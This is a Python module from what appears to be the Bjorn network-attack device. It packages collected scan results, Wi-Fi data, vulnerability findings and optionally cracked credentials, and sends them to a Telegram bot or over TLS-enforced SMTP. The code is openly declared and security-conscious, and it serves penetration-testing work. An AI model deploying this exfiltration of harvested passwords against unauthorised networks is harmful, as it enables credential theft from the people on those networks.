# telegram_client.py
# Report delivery for Bjorn (backlog Wave 2 + Wave 3). Telegram is the primary channel; SMTP is the
# config-swappable fallback for networks that block Telegram itself. Stdlib only (urllib + smtplib)
# -- no new dependency. (The module keeps its original name; it is imported as the delivery client.)
# Sends the *raw target dataset* (netkb + findings) as a JSON document so an AI agent can compile a
# report later, and only when the data has actually changed since the last send (delta detection).
# Kept dependency-free and separate from shared.py so both the standalone action and the web handler
# can call send_targets(), and the pure helpers are unit-testable without SharedData.
import os
import ssl
import csv
import json
import time
import uuid
import zipfile
import smtplib
import hashlib
import urllib.error
import urllib.parse
import urllib.request
from email.message import EmailMessage
from datetime import datetime, timezone

_API = "https://api.telegram.org/bot{token}/{method}"


def _api_url(token, method):
    return _API.format(token=token, method=method)


def _do(req, timeout=20):
    """Run a Telegram API request, return (ok, detail)."""
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            obj = json.loads(resp.read().decode("utf-8", errors="replace"))
        return (True, "sent") if obj.get("ok") else (False, obj.get("description", "telegram error"))
    except urllib.error.HTTPError as e:
        return (False, f"HTTP {e.code}: {e.read().decode('utf-8', errors='replace')[:200]}")
    except Exception as e:
        return (False, str(e))


def send_message(token, chat_id, text):
    """Plain-text message (no parse_mode -> no MarkdownV2 escaping to worry about)."""
    data = urllib.parse.urlencode({"chat_id": chat_id, "text": text}).encode()
    return _do(urllib.request.Request(_api_url(token, "sendMessage"), data=data))


def _subtype_for(filename):
    """MIME subtype from the extension. Both senders used to hardcode "json", which was fine while
    the only payload was the report — a zip announced as application/json is mislabelled, and mail
    clients (unlike Telegram) act on that."""
    return "zip" if str(filename).lower().endswith(".zip") else "json"


def _multipart_encode(fields, filename, content):
    """Build a multipart/form-data body for sendDocument. Pure/testable. `content` is bytes."""
    boundary = "----BjornBoundary" + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
                     .encode("utf-8"))
    parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="document"; '
                 f'filename="{filename}"\r\n'
                 f'Content-Type: application/{_subtype_for(filename)}\r\n\r\n'.encode("utf-8"))
    parts.append(content if isinstance(content, bytes) else content.encode("utf-8"))
    parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))
    return b"".join(parts), f"multipart/form-data; boundary={boundary}"


def send_document(token, chat_id, filename, content_bytes, caption=""):
    body, ctype = _multipart_encode({"chat_id": chat_id, "caption": caption}, filename, content_bytes)
    req = urllib.request.Request(_api_url(token, "sendDocument"), data=body,
                                 headers={"Content-Type": ctype})
    return _do(req)


# --- SMTP fallback channel ----------------------------------------------------------------
def send_email(shared_data, subject, body, filename=None, content_bytes=None):
    """Deliver over SMTP, optionally with a JSON attachment. Port 465 = implicit TLS, anything else
    = STARTTLS. Returns (ok, detail). Nothing is sent unless a host and a recipient are configured.

    The connection MUST be encrypted; there is no cleartext path. This payload carries every cracked
    credential when `telegram_include_creds` is on, and `login()` would put the user's own mailbox
    password on the wire besides. This channel is also reached precisely when the network was hostile
    enough to block Telegram (which is HTTPS-only), so a silent downgrade would hand secrets to
    exactly the network already interfering with delivery. Failing to send is the safe outcome:
    `send_targets` leaves the stored signature untouched, so the next cycle retries."""
    host = (getattr(shared_data, "smtp_host", "") or "").strip()
    to = (getattr(shared_data, "smtp_to", "") or "").strip()
    if not host or not to:
        return (False, "smtp host / recipient not set")
    port = int(getattr(shared_data, "smtp_port", 587) or 587)
    user = (getattr(shared_data, "smtp_user", "") or "").strip()
    password = getattr(shared_data, "smtp_password", "") or ""

    msg = EmailMessage()
    msg["From"] = user or f"bjorn@{host}"
    msg["To"] = to
    msg["Subject"] = subject
    msg.set_content(body)
    if filename and content_bytes:
        msg.add_attachment(content_bytes, maintype="application",
                           subtype=_subtype_for(filename), filename=filename)
    # Explicit context on both paths: smtplib's own default for SMTP_SSL has historically been an
    # unverified stdlib context, which would accept any certificate.
    context = ssl.create_default_context()
    try:
        smtp = (smtplib.SMTP_SSL(host, port, timeout=30, context=context) if port == 465
                else smtplib.SMTP(host, port, timeout=30))
        with smtp:
            if port != 465:
                try:
                    smtp.starttls(context=context)
                except smtplib.SMTPNotSupportedError:
                    return (False, f"{host}:{port} does not offer STARTTLS — refusing to send in "
                                   f"cleartext. Use port 465, or a server that supports STARTTLS.")
            if user and password:
                smtp.login(user, password)
            smtp.send_message(msg)
        return (True, "sent")
    except Exception as e:
        return (False, str(e))


def _deliver(shared_data, subject, filename, payload):
    """Send via Telegram, falling back to SMTP when Telegram is unconfigured or fails. Returns
    (ok, detail) where detail names the channel used (or why every channel was skipped)."""
    token = (getattr(shared_data, "telegram_bot_token", "") or "").strip()
    chat = (getattr(shared_data, "telegram_chat_id", "") or "").strip()
    if token and chat:
        ok, detail = (send_document(token, chat, filename, payload, subject) if payload
                      else send_message(token, chat, subject))
        if ok:
            return (True, "sent via telegram")
        first = f"telegram: {detail}"
    else:
        first = "telegram: bot token / chat id not set"

    if getattr(shared_data, "smtp_enabled", False):
        ok, detail = send_email(shared_data, subject, subject, filename, payload)
        if ok:
            return (True, "sent via smtp")
        return (False, f"{first}; smtp: {detail}")
    return (False, first)


def send_test(shared_data):
    """A short test message down whichever channel is configured. Returns (ok, detail)."""
    return _deliver(shared_data, "Bjorn test message", None, None)


# --- raw target dataset -------------------------------------------------------------------
def _read_csv(path):
    try:
        with open(path, newline="") as f:
            return list(csv.DictReader(f))
    except FileNotFoundError:
        return []


def _read_json_values(path, key):
    """The values of one dict key in a JSON file, as a list. [] when anything is missing or bad —
    a report must not fail to send because a catalogue file was half-written."""
    try:
        with open(path) as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError, TypeError):
        return []
    section = data.get(key) if isinstance(data, dict) else None
    if isinstance(section, dict):
        return list(section.values())
    return section if isinstance(section, list) else []


def _collect_creds(crackedpwddir):
    out = {}
    try:
        for name in sorted(os.listdir(crackedpwddir)):
            if name.endswith(".csv"):
                out[name] = _read_csv(os.path.join(crackedpwddir, name))
    except FileNotFoundError:
        pass
    return out


def compile_targets(shared_data, include_creds=True):
    """Assemble the raw target dataset from the CSVs already on disk (netkb + findings). No
    generated_at here, so the signature is stable when nothing changed."""
    sr = shared_data.scan_results_dir
    data = {
        "hosts": _read_csv(shared_data.netkbfile),
        "http_fingerprints": _read_csv(os.path.join(sr, "http_fingerprints.csv")),
        "web_findings": _read_csv(os.path.join(sr, "web_template_findings.csv")),
        "snmp": _read_csv(os.path.join(sr, "snmp_enum.csv")),
        "ble": _read_csv(os.path.join(sr, "ble_devices.csv")),
        "wifi_aps": _read_csv(os.path.join(sr, "wifi_aps.csv")),
        "wifi_clients": _read_csv(os.path.join(sr, "wifi_clients.csv")),
        "vulnerabilities": _read_csv(shared_data.vuln_summary_file),
        # The handshake *index*, not the PCAPs: the catalogue is what belongs in a report, and
        # shipping capture files through a third-party bot is a decision nobody made. The PCAPs
        # come off the device over SSH or the zip endpoint.
        "handshakes": _read_json_values(
            os.path.join(getattr(shared_data, "handshakes_dir", ""), "index.json"), "captures"),
    }
    if include_creds:
        data["credentials"] = _collect_creds(shared_data.crackedpwddir)
    return data


# ---------------------------------------------------------------------------
# The "everything in one file" bundle
# ---------------------------------------------------------------------------
# compile_targets() above is the curated report: a fixed list of CSVs, as JSON, for an agent to
# read. This is the other thing people want — every file Bjorn has actually collected, zipped, so
# it can be pulled off the device in one go. Logs are deliberately NOT in it: they are diagnostics
# rather than loot, and each page already exposes its own.
BUNDLE_NAME = "bjorn_bundle.zip"
# Telegram's bot sendDocument limit is 50 MB. Refuse a little under it and say so, rather than
# posting a doomed multipart upload and reporting whatever Telegram says about the failure.
TELEGRAM_MAX_BYTES = 45 * 1024 * 1024


def bundle_path(shared_data):
    """Where the compiled archive lives — in datadir, NOT under output_dir, so a rebuild never
    tries to pack the previous bundle into the new one."""
    return os.path.join(shared_data.datadir, BUNDLE_NAME)


def has_content(path):
    """True when a file holds actual data. Pure/testable.

    A CSV with only its header is not "collected data" — every module creates its output file up
    front, so a size check alone would bundle a dozen empty tables and make the archive look full.
    """
    try:
        if os.path.getsize(path) == 0:
            return False
    except OSError:
        return False
    if not path.lower().endswith(".csv"):
        return True
    try:
        with open(path, errors="replace") as f:
            return sum(1 for line in f if line.strip()) > 1
    except OSError:
        return False


def bundle_sources(shared_data, include_creds=True):
    """[(arcname, path)] for every non-empty collected file. Pure apart from reading the tree."""
    out = []
    seen = set()

    def add(path, arcname):
        real = os.path.abspath(path)
        if real in seen or not has_content(path):
            return
        seen.add(real)
        # ZIP entry names are always forward-slash separated, whatever the host OS. os.path.relpath
        # hands back backslashes on Windows, which made the reported names disagree with the
        # archive's own listing — harmless on the Pi, wrong everywhere the report is read.
        out.append((arcname.replace(os.sep, "/"), path))

    for single in (shared_data.netkbfile, shared_data.livestatusfile):
        add(single, os.path.basename(single))

    crackedpwd = os.path.abspath(shared_data.crackedpwddir)
    for dirpath, _dirs, files in os.walk(shared_data.output_dir):
        # Cracked credentials obey the same rule as the report: they leave the device only when
        # telegram_include_creds says so. The bundle is downloadable too, but it is the same file
        # either way, and defaulting to "ship the passwords" because it might be a local download
        # is not a call this should make quietly.
        if not include_creds and os.path.abspath(dirpath).startswith(crackedpwd):
            continue
        for name in sorted(files):
            full = os.path.join(dirpath, name)
            add(full, os.path.relpath(full, shared_data.output_dir))
    return out


def compile_bundle(shared_data, include_creds=None):
    """Zip every non-empty collected file into one archive. Returns (ok, detail, summary)."""
    if include_creds is None:
        include_creds = getattr(shared_data, "telegram_include_creds", True)
    sources = bundle_sources(shared_data, include_creds)
    if not sources:
        return False, "nothing collected yet — every output file is empty", {}

    path = bundle_path(shared_data)
    try:
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
            for arcname, full in sources:
                zf.write(full, arcname)
    except OSError as e:
        return False, f"could not write the archive: {e}", {}

    size = os.path.getsize(path)
    summary = {
        "files": len(sources),
        "bytes": size,
        "creds_included": bool(include_creds),
        "built": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "names": [arc for arc, _ in sources],
    }
    return True, f"{len(sources)} file(s), {_human_size(size)}", summary


def _human_size(n):
    """Bytes until it is worth saying KB. "0 KB" for a real archive reads like a failure."""
    return f"{n} B" if n < 1024 else (f"{n // 1024} KB" if n < 1024 * 1024
                                      else f"{n / (1024 * 1024):.1f} MB")


def bundle_summary(shared_data):
    """What is on disk right now, for the page to show without rebuilding anything."""
    path = bundle_path(shared_data)
    try:
        stat = os.stat(path)
    except OSError:
        return {"exists": False}
    return {"exists": True, "bytes": stat.st_size,
            "built": datetime.fromtimestamp(stat.st_mtime, timezone.utc).isoformat(timespec="seconds")}


def send_bundle(shared_data):
    """Send the already-compiled archive down whichever channel is configured. (ok, detail)."""
    path = bundle_path(shared_data)
    try:
        with open(path, "rb") as f:
            payload = f.read()
    except OSError:
        return False, "no bundle compiled yet — press Compile first"
    if len(payload) > TELEGRAM_MAX_BYTES:
        return False, (f"bundle is {len(payload) // (1024 * 1024)} MB, over the "
                       f"{TELEGRAM_MAX_BYTES // (1024 * 1024)} MB limit — download it instead")
    return _deliver(shared_data, f"Bjorn bundle ({_human_size(len(payload))})", BUNDLE_NAME, payload)


def _signature(data):
    return hashlib.sha256(json.dumps(data, sort_keys=True, default=str).encode("utf-8")).hexdigest()


def _load_json(path):
    try:
        with open(path) as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def _save_json(path, obj):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(obj, f)


def send_targets(shared_data, force=False):
    """Compile the raw target dataset and send it as a JSON document (Telegram, else SMTP) — but
    only when it changed since the last send (unless force). Returns (ok, detail, sent). Network
    errors leave the stored signature untouched so the next cycle retries when back online."""
    have_telegram = ((getattr(shared_data, "telegram_bot_token", "") or "").strip()
                     and (getattr(shared_data, "telegram_chat_id", "") or "").strip())
    if not have_telegram and not getattr(shared_data, "smtp_enabled", False):
        return (False, "no delivery channel configured", False)

    state_path = os.path.join(shared_data.datadir, "telegram_state.json")
    state = _load_json(state_path)
    now = time.time()

    # Clock first, data second. TelegramReport gets a turn on every idle cycle, and the rate floor
    # (default 300s) rejects most of them — but compile_targets() + _signature() ran *before* the
    # check, so every rejected turn still read netkb plus seven CSVs and SHA-256'd the lot before
    # throwing the result away. The interval check needs no data at all.
    if not force and now - state.get("ts", 0) < getattr(shared_data, "telegram_min_interval", 300):
        return (True, "rate-limited (min interval not elapsed)", False)

    data = compile_targets(shared_data, getattr(shared_data, "telegram_include_creds", True))
    sig = _signature(data)
    if not force and sig == state.get("hash"):
        return (True, "no change since last send", False)

    payload = json.dumps(
        {"generated_at": datetime.now(timezone.utc).isoformat(), "targets": data},
        indent=2, default=str).encode("utf-8")
    ts = time.strftime("%Y%m%d_%H%M%S")
    ok, detail = _deliver(shared_data, "Bjorn target data", f"bjorn_targets_{ts}.json", payload)
    if ok:
        _save_json(state_path, {"hash": sig, "ts": now})
    return (ok, detail, True)
